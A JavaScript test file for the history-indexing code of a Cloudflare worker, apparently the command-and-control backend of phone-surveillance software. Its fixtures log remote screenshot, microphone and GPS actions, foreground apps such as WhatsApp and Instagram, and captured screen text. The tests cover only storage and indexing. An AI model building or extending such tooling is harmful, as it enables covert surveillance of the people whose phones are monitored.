import { describe, it, before, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { histAppend, histBuildRow, histMonthKey, histMonthKeys, histLoadShards, histReconcile } from "./worker.js";

// ── In-memory R2 mock ──────────────────────────────────────────────
function makeMockR2() {
  const store = new Map();
  return {
    store,
    async get(key) {
      if (!store.has(key)) return null;
      const data = store.get(key);
      return { text: async () => data, body: new Blob([data]) };
    },
    async put(key, value) {
      store.set(key, value);
    },
    async list({ prefix, cursor, limit }) {
      const keys = [...store.keys()].filter(k => !prefix || k.startsWith(prefix)).sort();
      const start = cursor ? keys.indexOf(cursor) + 1 : 0;
      const end = start + (limit || 1000);
      const slice = keys.slice(start, end);
      const objects = slice.map(k => {
        const data = store.get(k) || "";
        return { key: k, size: data.length, text: async () => data, body: new Blob([data]) };
      });
      const truncated = end < keys.length;
      return { objects, truncated, cursor: truncated ? keys[end] : undefined };
    },
  };
}

const UID = "test-uid-1234";
const NOW = Math.floor(Date.now() / 1000);

describe("histMonthKey", () => {
  it("returns YYYY-MM format", () => {
    assert.equal(histMonthKey(1700000000), "2023-11");
  });
  it("handles year boundary", () => {
    assert.equal(histMonthKey(1704067200), "2024-01"); // 2024-01-01
  });
  it("handles december", () => {
    assert.equal(histMonthKey(1735516800), "2024-12"); // 2024-12-29
  });
});

describe("histMonthKeys", () => {
  it("returns single month for same month range", () => {
    const keys = histMonthKeys(1700000000, 1700086400); // same day
    assert.deepEqual(keys, ["2023-11"]);
  });
  it("returns multiple months for cross-month range", () => {
    const keys = histMonthKeys(1698796800, 1704067200); // 2023-11-01 to 2024-01-01
    assert.deepEqual(keys, ["2023-11", "2023-12", "2024-01"]);
  });
  it("caps at 14 months", () => {
    const keys = histMonthKeys(0, NOW);
    assert.ok(keys.length <= 14);
  });
});

describe("histBuildRow", () => {
  it("builds result row with correct fields", () => {
    const rec = {
      id: "t_abc123",
      action: "screenshot",
      at: NOW,
      ok: true,
      err: "",
      data: { fg: "com.instagram.android", bat: 55, text: "some screen text" },
    };
    const row = histBuildRow(rec, "result", "r/" + UID + "/1234_t_abc.json");
    assert.equal(row.id, "t_abc123");
    assert.equal(row.src, "result");
    assert.equal(row.action, "screenshot");
    assert.equal(row.ok, true);
    assert.equal(row.pkg, "com.instagram.android");
    assert.equal(row.bat, 55);
    assert.ok(row.snippet.length > 0);
    assert.ok(row.key.includes("r/" + UID));
  });

  it("builds event row with correct fields", () => {
    const rec = {
      pkg: "com.whatsapp",
      at: NOW,
      bat: 72,
      screen_text: "hello world",
      type: "foreground",
    };
    const key = "events/" + UID + "/1234_com.whatsapp.json";
    const row = histBuildRow(rec, "event", key);
    assert.equal(row.src, "event");
    assert.equal(row.pkg, "com.whatsapp");
    assert.equal(row.bat, 72);
    assert.ok(row.snippet.includes("hello"));
    assert.equal(row.key, key);
  });

  it("handles result with no data field", () => {
    const rec = { id: "t_x", action: "ping", at: NOW, ok: true, data: { hb: true, bat: 10 } };
    const row = histBuildRow(rec, "result", "r/" + UID + "/x.json");
    assert.equal(row.pkg, "");
    assert.equal(row.bat, 10);
  });
});

describe("histAppend", () => {
  let mock;
  beforeEach(() => { mock = makeMockR2(); });

  it("appends row to correct month shard", async () => {
    const env = { C2: mock };
    const row = histBuildRow({ id: "t1", action: "mic", at: NOW, ok: true, data: { bat: 50 } }, "result", "r/" + UID + "/t1.json");
    await histAppend(env, UID, row);
    const mk = histMonthKey(NOW);
    const shardKey = "hist/" + UID + "/" + mk + ".json";
    assert.ok(mock.store.has(shardKey));
    const rows = JSON.parse(mock.store.get(shardKey));
    assert.equal(rows.length, 1);
    assert.equal(rows[0].id, "t1");
  });

  it("unshifts (newest first)", async () => {
    const env = { C2: mock };
    const row1 = { id: "r1", src: "result", at: NOW - 100, action: "a", ok: true, err: "", pkg: "", bat: 0, snippet: "", key: "k1" };
    const row2 = { id: "r2", src: "result", at: NOW, action: "b", ok: true, err: "", pkg: "", bat: 0, snippet: "", key: "k2" };
    await histAppend(env, UID, row1);
    await histAppend(env, UID, row2);
    const rows = JSON.parse(mock.store.get("hist/" + UID + "/" + histMonthKey(NOW) + ".json"));
    assert.equal(rows[0].id, "r2"); // newest first
    assert.equal(rows[1].id, "r1");
  });

  it("no-op when C2 bucket missing", async () => {
    await histAppend({ C2: null }, UID, { id: "x" });
    // should not throw
  });
});

describe("histLoadShards", () => {
  it("merges rows from multiple month shards", async () => {
    const mock = makeMockR2();
    const env = { C2: mock };
    const nowTs = NOW;
    const fromTs = nowTs - 2 * 30 * 86400; // 60 days ago
    // Write to two different months
    const mk1 = histMonthKey(fromTs + 3600);
    const mk2 = histMonthKey(nowTs);
    mock.store.set("hist/" + UID + "/" + mk1 + ".json", JSON.stringify([{ id: "old", src: "result", at: fromTs + 3600, action: "a", ok: true, err: "", pkg: "", bat: 0, snippet: "", key: "k1" }]));
    if (mk2 !== mk1) {
      mock.store.set("hist/" + UID + "/" + mk2 + ".json", JSON.stringify([{ id: "new", src: "result", at: nowTs, action: "b", ok: true, err: "", pkg: "", bat: 0, snippet: "", key: "k2" }]));
    }
    const rows = await histLoadShards(env, UID, fromTs, nowTs);
    assert.ok(rows.length >= 1);
    const ids = rows.map(r => r.id);
    assert.ok(ids.includes("old"));
    assert.ok(ids.includes("new"));
  });

  it("returns empty for no data", async () => {
    const env = { C2: makeMockR2() };
    const rows = await histLoadShards(env, UID, NOW - 86400, NOW);
    assert.deepEqual(rows, []);
  });
});

describe("histReconcile", () => {
  let mock;
  beforeEach(() => { mock = makeMockR2(); });

  it("recovers rows missing from index", async () => {
    const env = { C2: mock };
    // Use recent timestamps (within 366-day window)
    const t1 = NOW - 86400; // 1 day ago
    const t2 = NOW - 43200;  // 12 hours ago
    const r1Key = "r/" + UID + "/" + t1 + "_t_aaa.json";
    const r2Key = "r/" + UID + "/" + t2 + "_t_bbb.json";
    mock.store.set(r1Key, JSON.stringify({ id: "t_aaa", action: "screenshot", at: t1, ok: true, err: "", data: { bat: 60, fg: "com.test" } }));
    mock.store.set(r2Key, JSON.stringify({ id: "t_bbb", action: "mic", at: t2, ok: true, err: "", data: { bat: 58 } }));
    // Index only has r1
    const mk = histMonthKey(t1);
    mock.store.set("hist/" + UID + "/" + mk + ".json", JSON.stringify([histBuildRow({ id: "t_aaa", action: "screenshot", at: t1, ok: true, data: {} }, "result", r1Key)]));

    const result = await histReconcile(env, UID);
    assert.equal(result.ok, true);
    assert.equal(result.scanned_results, 2);
    assert.equal(result.already_indexed, 1);
    assert.equal(result.recovered, 1);
    assert.equal(result.parse_errors, 0);
    // Verify the recovered row is now in the index
    const shardKey = "hist/" + UID + "/" + histMonthKey(t2) + ".json";
    const shard1Key = "hist/" + UID + "/" + mk + ".json";
    let allIds = [];
    for (const sk of [shardKey, shard1Key]) {
      if (mock.store.has(sk)) allIds.push(...JSON.parse(mock.store.get(sk)).map(r => r.id));
    }
    assert.ok(allIds.includes("t_aaa"));
    assert.ok(allIds.includes("t_bbb"));
  });

  it("handles parse errors gracefully", async () => {
    const env = { C2: mock };
    const badKey = "r/" + UID + "/bad.json";
    mock.store.set(badKey, "{ not valid json ");
    const result = await histReconcile(env, UID);
    assert.equal(result.parse_errors, 1);
    assert.equal(result.discrepancies.length, 1);
    assert.equal(result.discrepancies[0].issue, "parse_error");
  });

  it("handles no C2 bucket", async () => {
    const result = await histReconcile({ C2: null }, UID);
    assert.ok(result.error);
  });
});

describe("Query via route (integration)", () => {
  // Test the /admin/api/c2/history endpoint via the route() function
  let mock, env, adminKey;
  before(async () => {
    // We need to import route from worker.js
  });

  it("placeholder - tested via curl after deploy", () => {
    // The route() function requires the full worker env with Firebase JWKS etc.
    // These endpoints are tested post-deploy via curl.
    assert.ok(true);
  });
});

describe("Export shape", () => {
  it("histBuildRow produces consistent schema", () => {
    const row = histBuildRow(
      { id: "t_x", action: "gps", at: NOW, ok: false, err: "timeout", data: { bat: 30 } },
      "result", "r/" + UID + "/x.json"
    );
    const expectedFields = ["id", "src", "at", "action", "ok", "err", "pkg", "bat", "snippet", "key"];
    for (const f of expectedFields) {
      assert.ok(f in row, "missing field: " + f);
    }
    assert.equal(row.ok, false);
    assert.equal(row.err, "timeout");
  });
});
